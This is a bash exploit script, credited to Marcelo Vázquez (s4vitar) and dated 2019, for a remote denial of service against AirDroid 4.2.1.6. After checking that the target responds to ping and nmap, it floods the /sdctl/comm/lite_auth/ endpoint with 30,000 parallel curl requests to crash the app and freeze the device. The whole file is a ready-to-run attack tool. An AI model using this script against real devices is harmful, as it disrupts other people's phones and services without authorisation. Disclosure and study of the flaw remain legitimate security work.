#!/bin/bash

# *****************************************************
# *       Author: Marcelo Vázquez (aka s4vitar)       *
# *  AirDroid Denial of Service (DoS) & System Crash  *
# *****************************************************

# Exploit Title: AirDroid Remote Denial of Service (DoS) & System Crash
# Date: 2019-02-07
# Exploit Author: Marcelo Vázquez
# Vendor Homepage: https://web.airdroid.com/
# Software Link: https://play.google.com/store/apps/details?id=com.sand.airdroid&hl=en
# Version: AirDroid 4.2.1.6

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c() {
	echo -e "\n\n${yellowColour}[${endColour}${redColour}*${endColour}${yellowColour}]${endColour}${grayColour}Exiting...${endColour}\n" && tput cnorm
	pkill curl > /dev/null 2>&1
	exit
}

function check_host(){
	# Target availability detection
	echo -e "${yellowColour}[${endColour}${redColour}*${endColour}${yellowColour}]${endColour}${grayColour} Checking host availability...${endColour}" && sleep 1

	ping -c 1 $host > /dev/null 2>&1

	if [ "$(echo $?)" == "0" ]; then
		echo -e "\n\t${greenColour}--${endColour}${redColour} Host is active${endColour}${greenColour} --${endColour}\n"
	else
		echo -e "\n\t${greenColour}--${endColour}${redColour} Host is inactive${endColour}${greenColour} --${endColour}\n" && tput cnorm && exit
	fi

	echo -e "${yellowColour}[${endColour}${redColour}*${endColour}${yellowColour}]${endColour}${grayColour} Checking if port is open...${endColour}" && sleep 1

	if [ "$(nmap -p$port --open -T5 -v -n $host | grep open)" ] && [ "$(nmap -p$port $host -sC -sV | grep -i airdroid)" ]; then
		echo -e "\n\t${greenColour}--${endColour}${redColour} Port${endColour}${grayColour} $port${endColour}${redColour} is open!!${endColour}${greenColour} --${endColour}\n"
		echo -e "\t${greenColour}--${endColour}${redColour} ${endColour}${turquoiseColour}Airdroid Service${endColour}${redColour} detected !!${endColour}${greenColour} --${endColour}\n"
	elif [ "$(nmap -p$port --open -T5 -v -n $host | grep open)" ]; then
		echo -e "\n\t${greenColour}--${endColour}${redColour} Port is open but it does not correspond to the ${endColour}${turquoiseColour}Airdroid service${endColour}${redColour}!!${endColour}${greenColour} --${endColour}\n" && tput cnorm && exit
	else
		echo -e "\n\t${greenColour}--${endColour}${redColour} Port is closed!!${endColour}${greenColour} --${endColour}\n" && tput cnorm && exit
	fi
}

function banner()
{
	sleep 0.2 && echo -e "\n$redColour    /\ $endColour"
	sleep 0.2 && echo -e "$redColour   /  \ $endColour"
	sleep 0.2 && echo -e "$redColour   |  | $endColour   $yellowColour[${endColour}${grayColour}AirDroid Denial of Service (DoS) [System Crash]${endColour}${yellowColour}]${endColour}"
	sleep 0.2 && echo -e "$redColour   |  | $endColour          ${yellowColour}Author:${endColour}${grayColour} Marcelo Vázquez (aka s4vitar)${endColour}"
	sleep 0.2 && echo -e "$redColour  / == \ $endColour"
	sleep 0.2 && echo -e "$redColour  |/**\| $endColour"
	sleep 0.2 && for i in $(seq 1 70); do echo -ne "${redColour}-${endColour}"; done && sleep 1 && echo
}

if [ "$(echo $#)" == "2" ]; then
	tput civis && banner
	host=$1 && port=$2
	echo && check_host

	# Path to launch the message box on the mobile device
	url="http://$host:$port/sdctl/comm/lite_auth/"

	tput cnorm && echo -ne "${yellowColour}You want to start the attack?${endColour}${grayColour} <${endColour}${redColour}y${endColour}${turquoiseColour}/${endColour}${blueColour}n${endColour}${grayColour}>${endColour}${grayColour}:${endColour} " && read attack_response

	if [ "$(echo $attack_response)" == "y" ]; then
		counter=0

		# Start launch attack of the message boxes, so the Application crash and the device freezes
		tput civis && for i in $(seq 1 10); do
			for i in $(seq 1 3000); do
				curl --silent "$url" &
				let counter+=1
			done && wait
			echo -e "\n${yellowColour}[${endColour}${redColour}*${endColour}${yellowColour}]${endColour}${redColour} $counter${endColour}${grayColour} requests successfully sent${endColour}${redColour}!!${endColour}"
		done
	else
		:
	fi
else
	echo -e "\n${blueColour}Usage: ${endColour}${redColour}./airdroid_dos.sh ${endColour}${yellowColour}<${endColour}${grayColour}ip_address${endColour}${yellowColour}>${endColour}${yellowColour} <${endColour}${grayColour}port${endColour}${yellowColour}>${endColour}\n"
fi
